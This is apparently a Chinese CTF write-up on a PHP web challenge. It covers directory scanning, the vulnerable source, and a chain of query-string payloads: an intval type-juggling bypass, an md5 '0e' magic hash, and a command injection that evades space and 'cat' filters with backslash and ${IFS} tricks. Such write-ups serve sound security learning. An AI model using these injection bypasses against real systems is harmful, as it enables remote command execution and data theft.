![[Pasted image 20221121210931.png]]

---
首页长这样
![[Pasted image 20221121210920.png]]
很怪，标题编码出了点问题，burp里面又能正确显示
![[Pasted image 20221121211528.png]]
有报错，但没看懂.jpg

用`dirsearch`扫扫看
![[Pasted image 20221121214141.png]]
```php
/robots.txt
```
![[Pasted image 20221121212704.png]]

```php
/fAke_f1agggg.php
```
![[Pasted image 20221121212912.png]]
是假的呜呜呜～

但是翻响应头翻到了点东西
![[Pasted image 20221121212901.png]]

```php
/fl4g.php
```
![[Pasted image 20221121213632.png]]
hmmm，为啥又是烦人的编码问题啊啊啊
搜了下，最后害得先进的浏览器收拾摊子
![[Pasted image 20221121213808.png]]

---
```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```

---
`level 1`的弱类型比较利用半天没过去，结果发现自己本地跑的`php`版本太高，已经修复了。
大致就是利用`$num+1`时字符串隐式转换的规则和`intval`不同来绕过
```php
/?num=1e5
```

---
`level 2`是md5弱类型比较绕过，`0e`打头的字符串弱类型比较时等价于`0`，网上有大佬写了代码枚举自身`0e`打头，`md5`值也为`0e`打头的字符串
https://blog.csdn.net/SopRomeo/article/details/106237931
```python
def run():
    i = 0
    while True:
        text = '0e{}'.format(i)
        m = md5(text)
        print(text,m)
        if m[0:2] == '0e' :
            if m[2:].isdigit():
                find=[]
                print('find it:',text,":",m)
                find = find.append(text)
        i +=1
    return find

t = run()
print(t)
```

```php
/?num=1e5&md5=0e215962017
```

---
`get flag`就氵起来了
```php
/?num=1e5&md5=0e215962017&get_flag=ls
```
![[Pasted image 20221121224622.png]]
```php
/?num=1e5&md5=0e215962017&get_flag=ca\t${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```
![[Pasted image 20221121224740.png]]

#Web #PHP #字符 #编码 #目录爆破 #HTTP #Header #代码审计 #函数 #绕过 #md5 #Misc #shell #RCE 